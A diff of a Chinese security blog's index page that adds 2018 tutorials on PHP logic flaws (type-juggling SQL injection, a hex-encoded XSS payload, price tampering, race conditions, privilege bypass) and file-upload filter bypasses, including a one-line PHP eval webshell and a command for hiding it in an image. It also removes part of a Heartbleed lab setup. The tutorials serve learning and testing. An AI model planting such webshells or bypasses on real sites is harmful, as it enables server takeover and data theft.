@@ -258,6 +258,412 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/逻辑处理漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/17/逻辑处理漏洞/" itemprop="url">
+                  逻辑处理漏洞
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-17T18:32:46+08:00">
+                2018-04-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/17/逻辑处理漏洞/" class="leancloud_visitors" data-flag-title="逻辑处理漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-逻辑处理漏洞"><a href="#0x00-逻辑处理漏洞" class="headerlink" title="0x00 逻辑处理漏洞"></a>0x00 逻辑处理漏洞</h2><p>很多漏洞出现的原因是在代码编写的环节没有考虑到一些安全问题，由程序逻辑失误导致的，这里记录一下一些常见的逻辑处理漏洞。</p>
+<h2 id="0x01-in-array函数"><a href="#0x01-in-array函数" class="headerlink" title="0x01 in_array函数"></a>0x01 in_array函数</h2><p>in_array()函数是用来判断一个值是否在一个列表里面，一般用法如下：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(&apos;b&apos;,array(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;))</span><br></pre></td></tr></table></figure>
+<p>当我们php代码中这样写时：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(in_array($_GET[&apos;id&apos;],array(1,2,3,4)))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;select where id=&apos;&quot;.$_GET[&apos;id&apos;].&quot;&apos;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码判断得到的参数id的值是否在array这个数组中，但是这里如果输入id=1’ union select <em> from user，in_array()函数会自动进行类型转换，就会认为这个输入参数类型转换之后是1，属于array数组中，就会执行select where id =’1’ union select </em> from user。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic01.png" alt=""></p>
+<h2 id="0x02-双等于和三等于"><a href="#0x02-双等于和三等于" class="headerlink" title="0x02 双等于和三等于"></a>0x02 双等于和三等于</h2><p>php中，双等于与三等于之间有一些区别，其中双等于在判断等于之前会先进行数据类型转换，而三等于则不会，所以在一些情况下，双等于会造成一些安全问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_GET[&apos;var&apos;]==2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>var_dump()函数用于输出变量结构、内容和类型，一般用于精确调试。  </p>
+<p>这里我们如果给出var=2abcd,就会返回bool(true),发现类型强制转换之后判断为true。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic02.png" alt=""></p>
+<h2 id="0x03-is-numeric函数"><a href="#0x03-is-numeric函数" class="headerlink" title="0x03 is_numeric函数"></a>0x03 is_numeric函数</h2><p>in_numeric()用来判断一个变量是否为数字，如果检查通过返回true，否则返回false</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(is_numeric($_GET[&apos;var&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into user values(&apos;user&apos;,&#123;$_GET[&apos;var&apos;]&#125;)&quot;;</span><br><span class="line">    echo $sql;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这个函数存在一个问题，那就是当传入hex时直接通过并返回true，但是mysql中是可以通过hex编码代替明文的，如我们提交一个xss测试代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>对应的hex编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3c7363726970743e616c6572742831293c2f7363726970743e</span><br></pre></td></tr></table></figure></p>
+<p>就会成功的将代码传入数据库。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic03.png" alt=""></p>
+<h2 id="0x04-订单支付漏洞"><a href="#0x04-订单支付漏洞" class="headerlink" title="0x04 订单支付漏洞"></a>0x04 订单支付漏洞</h2><p>在一些电商网站会出现的一些逻辑漏洞，主要是客户可以更改单价、总价、数量等，然后提交之后后台未作严格的校验导致的。</p>
+<p>比如价格可以在客户端提交，那么原本几千元的商品，我们抓包修改提交订单的商品单价为1，如果后台未作校验直接跳转支付界面，那么就可以用一元钱购买物品。总价也是同理。</p>
+<p>再比如将要购买的商品数量或单价改为负数，如果后台未作检验，那么计算总价时就会计算出负数，反而会让我们越买钱越多。</p>
+<h2 id="0x05-利用时间差"><a href="#0x05-利用时间差" class="headerlink" title="0x05 利用时间差"></a>0x05 利用时间差</h2><p>这种类型在早期刷钻的时候出现过，先发给腾讯一条开通某钻的订单，然后再发送一个取消业务的短信给运营商，这样腾讯那边成功开通但是无法扣费，就实现了刷钻。</p>
+<p>还有就是在购买商品时，判断余额这条语句和扣费语句之间有某几条语句浪费了一些时间。比如我们有10元钱，然后商品也是10元，我们就可以以极快的速度发很多个请求，这个时候还没用扣费所以判断余额10元足够开通，然后请求都发送之后，获得了很多个10元钱请求的商品，然后才开始扣费，使余额成为负数，但是商品已经全部成功买到。</p>
+<h2 id="0x06-水平权限漏洞"><a href="#0x06-水平权限漏洞" class="headerlink" title="0x06 水平权限漏洞"></a>0x06 水平权限漏洞</h2><p>水平越权，即是相同级别的用户或者同一角色的不同用户之间，可以越权访问修改或者删除等重要功能。  </p>
+<p>如果我们自己的页面最后的id是12300，如果设计者没有考虑到水平权限的问题再次验证用户访问的空间是否属于这个用户自身的话，那么就可以通过遍历来得到所有用户的信息，甚至进行修改等。</p>
+<h2 id="0x07-垂直权限漏洞"><a href="#0x07-垂直权限漏洞" class="headerlink" title="0x07 垂直权限漏洞"></a>0x07 垂直权限漏洞</h2><p>垂直越权就是低权限用户(普通用户)可以访问更高权限(如管理员)才能访问到的资源。  </p>
+<p>如之前淘宝举报号任意访问的问题，我们通过普通用户的身份，可以访问只有管理员才能访问的举报信息，就是这里的权限检查出现问题。</p>
+<h2 id="0x08-未授权访问"><a href="#0x08-未授权访问" class="headerlink" title="0x08 未授权访问"></a>0x08 未授权访问</h2><p>这个漏洞广泛存在于目前的网络中，很多公司都没有对自己公司的某些敏感目录做访问限制，使得外网可以直接通过浏览器访问。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic04.jpg" alt=""></p>
+<p>如正方教务系统的后台敏感日志查看漏洞</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic05.png" alt=""></p>
+<p>我们在正方教务系统的登陆页面后面加上/log/2018-04-17-log.txt，就可以直接访问后台敏感日志。</p>
+<p>有的公司的files信息和phpinfo信息，也直接暴露给用户，会被获得很多敏感信息。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic06.jpg" alt=""></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/logic/logic07.png" alt=""></p>
+<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>逻辑处理漏洞还有很多类型，比如验证码爆破、密码找回等等，这些漏洞虽然原理不难理解，但是由于程序员编写代码时的考虑不周，导致逻辑处理漏洞广泛存在，并且危害极高，解决逻辑处理漏洞，更需要的是安全工作人员和开发人员的沟通配合。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/12/文件上传漏洞绕过方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/12/文件上传漏洞绕过方式总结/" itemprop="url">
+                  文件上传漏洞绕过方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-12T13:37:31+08:00">
+                2018-04-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/12/文件上传漏洞绕过方式总结/" class="leancloud_visitors" data-flag-title="文件上传漏洞绕过方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-文件上传漏洞"><a href="#0x00-文件上传漏洞" class="headerlink" title="0x00 文件上传漏洞"></a>0x00 文件上传漏洞</h2><p>在网站一些可以上传文件的地方，利用上传漏洞上传木马可以直接得到WEBSHELL，危害等级极高。上一篇文件上传漏洞的博客介绍了文件上传漏洞的原理和实战，这里来记录一些常见的绕过方法。</p>
+<h2 id="0x01-绕过前端验证"><a href="#0x01-绕过前端验证" class="headerlink" title="0x01 绕过前端验证"></a>0x01 绕过前端验证</h2><p>我们都知道，任何基于前端的验证都是不安全的，因为用户能直接修改它进行绕过。</p>
+<p>如果在前端对上传文件的格式进行了限制，我们可以通过以下的办法进行绕过:</p>
+<ul>
+<li><p>禁用js<br>我们通过firefox中的一个插件NoScript，将脚本禁用，这个时候上传文件的时候就不会触发js校验。</p>
+</li>
+<li><p>修改可上传的文件类型<br>因为是基于前端的验证，所有代码我们都可以通过firebug来修改，只需要在允许的类型中加入我们的文件类型，或者在禁止的类型中删除我们的文件类型，提交即可饶过。</p>
+</li>
+<li><p>通过BurpSuite绕过<br>我们通过BurpSuite进行绕过时，首先将文件名后缀改成它允许的类型，然后通过了前端的检查之后截取这个包，将文件后缀再改回来，就成功的绕过了js检查。</p>
+</li>
+</ul>
+<h2 id="0x02-后端检测-MIME"><a href="#0x02-后端检测-MIME" class="headerlink" title="0x02 后端检测-MIME"></a>0x02 后端检测-MIME</h2><p>此类后端检查时，检查的是Content-Type，也叫Mime-Type，这个时候，我们上传一个PHP文件，通过BurpSuite抓包，将.php后缀的Content-Type: application/octet-stream更改为.jpg的Content-Type: image/jpeg。<br>然后发包，就可以绕过后端基于Content-Type的检测。</p>
+<h2 id="0x03-后端检测-文件头"><a href="#0x03-后端检测-文件头" class="headerlink" title="0x03 后端检测-文件头"></a>0x03 后端检测-文件头</h2><p>这个时候他会检测文件的16进制数据头是否是合法文件的数据头，这个时候我们找一个普通的图片文件，再写一个一句话木马文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[123456])?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后通过前面隐写术的方法，进入两个文件的路径，在cmd中输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy/b 1.jpg+1.php 2.jpg</span><br></pre></td></tr></table></figure></p>
+<p>制作成图片马，即可通过菜刀连接一句话木马。</p>
+<h2 id="0x04-后端检测-黑名单"><a href="#0x04-后端检测-黑名单" class="headerlink" title="0x04 后端检测-黑名单"></a>0x04 后端检测-黑名单</h2><p>对于黑名单的检测方式，我们有如下几种办法绕过：</p>
+<ul>
+<li>后缀名大小写混用<br>假如.php后缀，我们可以写成.PHp之类的形式，用于一些过滤不严谨的系统。</li>
+<li>双写后缀<br>在一些系统中，仅仅匹配非法后缀删除，这个时候我们构造.pphphp，当它将第一个php匹配删除之后，剩下的字符又重新组合成了.php。</li>
+<li>同义后缀名<br>很多文件的后缀名不止一个，一些不常用的后缀名如果没有加入黑名单，就可以通过其他的同义后缀绕过。</li>
+</ul>
+<h2 id="0x05-后端检测-iis解析漏洞"><a href="#0x05-后端检测-iis解析漏洞" class="headerlink" title="0x05 后端检测-iis解析漏洞"></a>0x05 后端检测-iis解析漏洞</h2><p>在iis6中，如果提交图片格式为1.asp;.jpg，后缀是jpg可以绕过检测，然后在上传后就会被解析成asp格式的文件，这个时候通过上面的办法制作图片马，然后上传后通过菜刀连接上传后的图片马即可。</p>
+<h2 id="0x06-目录禁止执行"><a href="#0x06-目录禁止执行" class="headerlink" title="0x06 目录禁止执行"></a>0x06 目录禁止执行</h2><p>在一些存放上传文件的目录，禁止执行脚本，这个时候我们可以通过在这个目录创建新的子目录，然后将脚本写入子目录中，即可执行。</p>
+<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>文件上传漏洞带来的危害十分巨大，在有文件上传的位置，一定要做严格的检查，不能因为开发一时的方便而忽视危害，建议在开发时遵循如下几点：</p>
+<ul>
+<li>1.应用白名单的方式过滤文件扩展名</li>
+<li>2.使用三等于（===）来对比扩展名（防止类型转换带来的逻辑漏洞，之后写逻辑漏洞的时候会写到）</li>
+<li>3.如果不是图片等必要呈现出来的文件，对上传路径设置权限。</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/04/跨站脚本攻击XSS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1930,494 +2336,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/27/openssl心脏出血漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/01/27/openssl心脏出血漏洞/" itemprop="url">
-                  openssl心脏出血漏洞
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-27T15:30:39+08:00">
-                2018-01-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/01/27/openssl心脏出血漏洞/" class="leancloud_visitors" data-flag-title="openssl心脏出血漏洞">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-heartbleed漏洞"><a href="#0x00-heartbleed漏洞" class="headerlink" title="0x00 heartbleed漏洞"></a>0x00 heartbleed漏洞</h2><p>Heartbleed漏洞，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。  </p>
-<h2 id="0x02-基本背景和影响"><a href="#0x02-基本背景和影响" class="headerlink" title="0x02 基本背景和影响"></a>0x02 基本背景和影响</h2><p>OpenSSL心脏出血漏洞的大概原理是OpenSSL在2年前引入了心跳(heartbeat)机制来维持TLS链接的长期存在，心跳机制是作为TLS的扩展实现，但在代码中包括TLS(TCP)和DTLS(UDP)都没有做边界的检测，所以导致攻击者可以利用这个漏洞来获得TLS链接对端（可以是服务器，也可以是客户端）内存中的一些数据，至少可以获得16KB每次，理论上讲最大可以获取64KB。  </p>
-<p>OpenSSL是为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及SSL协议．多数SSL加密网站是用名为OpenSSL的开源软件包，由于这也是互联网应用最广泛的安全传输方法，被网银、在线支付、电商网站、门户网站、电子邮件等重要网站广泛使用，所以漏洞影响范围广大。  </p>
-<h2 id="0x03-openssl编译安装"><a href="#0x03-openssl编译安装" class="headerlink" title="0x03 openssl编译安装"></a>0x03 openssl编译安装</h2><p>1、安装配置openssl并解决本机自带openssl<br>因为要替换本机版本，所以我们要用到编译安装<br>首先下载最后受漏洞影响的1.0.1f版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz</span><br></pre></td></tr></table></figure></p>
-<p>先执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /usr/bin/pod2man</span><br></pre></td></tr></table></figure></p>
-<p>防止编译安装openssl报错：POD document had syntax errors at /usr/bin/pod2man line 69. make: *** [install_docs]  </p>
-<p>然后解压下载的openssl后，在解压后的目录输入下面命令编译安装到/usr/local/openssl目录  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./config shared zlib  --prefix=/usr/local/openssl &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
-<p>等待编译完成，依次执行以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./config -t</span><br><span class="line">make depend</span><br><span class="line">cd /usr/local</span><br><span class="line">ln -s openssl ssl</span><br></pre></td></tr></table></figure></p>
-<p>在/etc/ld.so.conf文件的最后面，添加如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/openssl/lib</span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure></p>
-<p>添加OPENSSL的环境变量：<br>在etc/profile的最后一行，添加：  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export OPENSSL=/usr/local/openssl/bin</span><br><span class="line">export PATH=$OPENSSL:$PATH:$HOME/bin</span><br></pre></td></tr></table></figure>
-<p>退出命令界面，再从新登录。  </p>
-<p>依次执行下列名令，移除原版本的openssl，创建新的软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mv /usr/bin/openssl /usr/bin/openssl.old</span><br><span class="line">mv /usr/include/openssl /usr/include/openssl.old</span><br><span class="line">ln -s /usr/local/openssl/bin/openssl /usr/bin/openssl</span><br><span class="line">ln -s /usr/local/openssl/include/openssl /usr/include/openssl</span><br><span class="line">ln -sf /usr/local/openssl/lib/libcrypto.so.1.0.0 /lib/libcrypto.so.6</span><br><span class="line">echo &quot;/usr/local/openssl/lib&quot; &gt;&gt;/etc/ld.so.conf </span><br><span class="line">ldconfig -v</span><br></pre></td></tr></table></figure></p>
-<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd /usr/local/openssl/bin/openssl</span><br></pre></td></tr></table></figure></p>
-<p>会出现类似如下信息：<br><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed01.png" alt=""><br>测试新版本的OpenSSL是否正常工作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl</span><br><span class="line">OpenSSL&gt; version -a</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed02.png" alt="">  </p>
-<p>此时，openssl安装完毕。  </p>
-<h2 id="0x04-apache编译安装"><a href="#0x04-apache编译安装" class="headerlink" title="0x04 apache编译安装"></a>0x04 apache编译安装</h2><p>如果用之前yum安装的apache，用nmap扫描heartbleed漏洞仍然会是没有漏洞的版本，所以我们要重新编译安装apache并链接到我们的openssl1.0.1f版本。  </p>
-<p>方法如下：  </p>
-<p>下载apache源码进行编译安装，并且要安装依赖arp 和arp-util :<br>下载过程不再赘述<br>arp安装:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
-<p>arp-util安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/apr/util --with-apr=/usr/local/apr</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
-<p>apache安装，并配置到arp和arp-util和1.0.1f的openssl版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr/local/httpd --enable-so --enable-rewrite --enable-ssl --with-ssl=/usr/local/openssl --with-apr=/usr/local/apr --with-apr-util=/usr/local/apr/util</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
-<p>此时apache重装完毕。  </p>
-<h2 id="0x05-apache和openssl配置"><a href="#0x05-apache和openssl配置" class="headerlink" title="0x05 apache和openssl配置"></a>0x05 apache和openssl配置</h2><p>首先安装依赖包：mod_ssl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install mod_ssl</span><br></pre></td></tr></table></figure></p>
-<p>在安装目录下的httpd.conf中添加ssl支持（注意这里是刚安装的apache目录，不要去配置原来的apache）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule ssl_module    modules/mod_ssl.so</span><br></pre></td></tr></table></figure></p>
-<p>并启动重定向（同样在httpd.conf）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond %&#123;SERVER_PORT&#125; !^443$</span><br><span class="line">RewriteRule ^/?(.*)$ https://%&#123;SERVER_NAME&#125;/$1 [L,R]</span><br></pre></td></tr></table></figure></p>
-<p>利用openssl生成证书并修改Apache配置，实现https访问  </p>
-<p>（1）生成私钥(key文件):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -des3 -out server.key 1024</span><br></pre></td></tr></table></figure></p>
-<p>去除key文件口令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in server.key -out server.key</span><br></pre></td></tr></table></figure></p>
-<p>（2）生成Certificate Signing Request（CSR）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key server.key -out server.csr</span><br></pre></td></tr></table></figure></p>
-<p>依照其指示一步一步输入要求的个人信息即可<br>（3）建立服务器密钥请求文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -keyout server.key -out server.crt</span><br></pre></td></tr></table></figure></p>
-<p>（4）建立服务器证书<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl server.crt -req -signkey server.key -days 365</span><br></pre></td></tr></table></figure></p>
-<p>（5）将刚才生成的几个文件放在任意文件夹，然后vi编辑ssl.conf：</p>
-<p>将SSLCertificateFile和SSLCertificateKeyFile设置对应到这个路径的相应文件：  </p>
-<p><img src="http://oo3iot5oz.bkt.clouddn.com/heardbleed/heartbleed03.png" alt="">  </p>
